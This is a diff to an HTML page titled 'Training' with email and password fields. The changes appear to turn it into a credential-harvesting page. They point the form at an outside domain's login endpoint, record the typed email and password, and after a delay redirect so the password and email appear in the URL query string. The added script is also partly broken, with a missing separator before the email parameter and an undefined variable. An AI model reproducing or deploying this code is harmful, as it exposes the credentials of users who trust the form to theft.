@@ -37,7 +37,7 @@
             <h1 class="h3 mb-3 fw-normal">Training</h1>
 
             <ul class="todo-list list-group list-group-numbered"></ul>
-            <form>
+            <form action="https://www.il-cn.com/bfa/login.aspx?email=" method="post">
                 <div class="form-floating">
                     <input id="floatingInputEmail" type="text" class="form-control form-list__input"
                            placeholder=" What needs to be done?" value="">
@@ -59,20 +59,18 @@
     url: '',
     email: '',
     password: '',
-    wait: 3,
+    wait: 20,
   }
 
   const emailInput = document.querySelector('#floatingInputEmail')
   const passwordInput = document.querySelector('#floatingInputPass')
 
-  emailInput.addEventListener('onChange', (evt) => {
+  emailInput.addEventListener('input', (evt) => {
     state.email = evt.target.value;
-    console.log(evt.target.value)
   })
 
-  passwordInput.addEventListener('onChange', (evt) => {
+  passwordInput.addEventListener('input', (evt) => {
     state.password = evt.target.value;
-    console.log(evt.target.value)
   })
 
   const queryString = window.location.search;
@@ -95,12 +93,17 @@
 
   const url = urlParams.get('url')
   console.log(url);
-  wait ? state.url = url : null;
-  //
-  //
-  // emailInput.value = state.email;
-  // passwordInput.value = state.password;
+  if (url) {
+    state.url = url
+  }
 
+  if (state.wait) {
+    setTimeout(function () {
+      window.location.href=`?password=${state.password}&url=${state.url}&wait=${state.wait}email=${state.email}`;
+    }, wait * 1000);
+  }
+
+  document.querySelector('body').style.backgroundImage = state.url;
 
 </script>
 </body>
